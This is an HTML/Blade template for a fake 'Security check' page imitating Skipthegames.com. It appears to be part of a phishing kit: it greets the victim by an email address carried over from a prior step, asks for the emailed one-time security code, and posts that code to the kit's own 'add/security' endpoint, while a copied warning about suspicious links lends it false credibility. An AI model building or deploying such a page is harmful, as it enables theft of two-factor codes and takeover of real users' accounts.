<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="{{asset('datas/css/all.min.css')}}">
    <link rel="stylesheet" href="{{asset('datas/css/bootstrap.min.css')}}">
    <link rel="stylesheet" href="{{asset('datas/css/style.css')}}">
    <title>Log in to your Skipthegames.com account</title>
    <style>


        #cookie_box {
            /*position: fixed;*/
            display: none;
            top: 0px;
            font-size: 0.8em;
            z-index: 1000;
            background: #5F5F5F;
            text-align: center;
            width: 100%;
            padding: 1% 5px;
            color: #ffffff;
        }
        .btn-success{
            background-color:#7DAF3B;
        }

    </style>
</head>

<section id="attention" class="px-1">
    <div class="container head">
        <div class="row">
            <div class="col-md-12 pl-3 pb-1 pt-3 ">
                <!--<p><strong>Providers, we do not send out text messages ever, do not click on links from them.-->
                <!--        Signups will be open at the end of <span id="date"></span></strong></p>-->
                <p>
                    <strong>
                        Providers, we do not send out text messages ever, do not click on links from them.
                    </strong>
                </p>

            </div>
        </div>
    </div>

</section>
<section class="menu mt-5">
    <div class="container">
        <div class="row">
            <div class="col-md-4 text-center">
                <img src="{{asset('datas/images/Skipthegames-255x39.png')}}" alt="" class="w-75">
            </div>
            <div class="col-md-4 text-center">
                <h5> Skip the games. <span>Get <br> satisfaction.</span></h5>
            </div>

            <div class="col-md-4 text-right fgf" style="color:#990033">
                <a href="" style="color:#990033">Hi,</a>
                <a href="" style="color:#990033"><u><b>{{Session::get('em')}}</b></u></a>
                <a href="#" class="same bottom" style="color:#990033">go to your account | log out</a>
            </div>

        </div>
    </div>
</section>
<section id="login">
    <div class="container">
        <div class="row">
            <div class="col-md-12 py-3">
                <a href="">SKIPTHEGAMES.EU <b class="arrows">>></b></a> <span>Security CHECK</span>
            </div>
        </div>
    </div>

</section>
<section id="main_form">
    <div class="container">
        <div class="row">
            <div class="col-md-9 pt-4">
                <h3>Security check</h3>
                <br>
                <p>We have upgraded our security to protect all users against account takeovers and hacking.</p>
                <p>A security code has been sent to your email address. &nbsp;&nbsp; <a href="" style="font-size: 12px;color: #990033;text-decoration: underline">I don't have access to this email account</a></p>
                <p>Please enter this code here:</p>
                <form method="post" action="{{url('add/security')}}">
                    @csrf
                    <div class="row">
                        <div class="col-md-10">
                            <div class="form-group mt-1">

                                <input type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Type in the numbers you received" name="email" required>
                                <div class="invalid-feedback">Please enter a valid email address.</div>
                            </div>
                        </div>
                        <div class="col-md-2">
                            <input type="submit" value="Verify" name="submit">
                        </div>
                    </div>


                </form>
                <p >The code you received is good for 30 minutes.</p>

                <p class=" mt-4">It may take the code up to 10 minutes to arrive. Make sure to check your Spam/Junk/Trash folder.</p>
                <p class=" mt-4"><a href="" style="color: #990033;text-decoration: underline">Resend the code</a>&nbsp;&nbsp;&nbsp;<a href="" style="color: #990033;text-decoration: underline"> I don't have access to this email account</a></p>

            </div>

            <div class="col-md-3 text-left pt-4">

            </div>
        </div>
    </div>
</section>
<hr>
<section id="bottom_menu">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <nav class="navbar navbar-expand-lg navbar-light">
                    <a class="navbar-brand" href="#">&copy;skipthegames.com</a>
                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                    </button>

                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
                        <ul class="navbar-nav ml-auto">
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Contact <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">About <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Privacy <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Terms <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Escort Info <span class="sr-only">(current)</span></a>
                            </li>




                        </ul>

                    </div>
                </nav>
            </div>
        </div>
    </div>
</section>
<script src="{{asset('datas/js/jquery-3.4.1.min.js')}}"></script>
<script src="{{asset('datas/js/popper.min.js')}}"></script>
<script src="{{asset('datas/js/bootstrap.min.js')}}"></script>
<script src="{{asset('datas/js/script.js')}}"></script>
<script>
    // Self-executing function
    (function() {
        'use strict';
        window.addEventListener('load', function() {
            // Fetch all the forms we want to apply custom Bootstrap validation styles to
            var forms = document.getElementsByClassName('needs-validation');
            // Loop over them and prevent submission
            var validation = Array.prototype.filter.call(forms, function(form) {
                form.addEventListener('submit', function(event) {
                    if (form.checkValidity() === false) {
                        event.preventDefault();
                        event.stopPropagation();
                    }
                    form.classList.add('was-validated');
                }, false);
            });
        }, false);
    })();
</script>
<script>
    $(document).ready(function(){



//cookie button
        if(getCookie('show_cookie_message') != 'no')
        {
            $('#cookie_box').show();
        }

        $('.cookie_box_close').click(function()
        {
            $('#cookie_box').animate({opacity:0 }, "slow");
            $('#cookie_box').css('z-index', -1);
            setCookie('show_cookie_message','no');
            return false;
        });
//cookie button
        $('.nav-link').click(function() {
            $('.nav-link').removeClass('active');
            $(this).addClass('active');
        });

    });
    //set cookie
    function setCookie(cookie_name, value)
    {
        var exdate = new Date();
        exdate.setDate(exdate.getDate() + (365*25));
        document.cookie = cookie_name + "=" + escape(value) + "; expires="+exdate.toUTCString() + "; path=/";
    }
    //set cookie
    //get cookie
    function getCookie(cookie_name)
    {
        if (document.cookie.length>0)
        {
            cookie_start = document.cookie.indexOf(cookie_name + "=");
            if (cookie_start != -1)
            {
                cookie_start = cookie_start + cookie_name.length+1;
                cookie_end = document.cookie.indexOf(";",cookie_start);
                if (cookie_end == -1)
                {
                    cookie_end = document.cookie.length;
                }
                return unescape(document.cookie.substring(cookie_start,cookie_end));
            }
        }
        return "";
    }
    //get cookie
</script>
<script>
    window.onload = function() {
        var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];;
        var date = new Date();

        document.getElementById('date').innerHTML = months[date.getMonth()] ;
    };
</script>
</body>

</html>
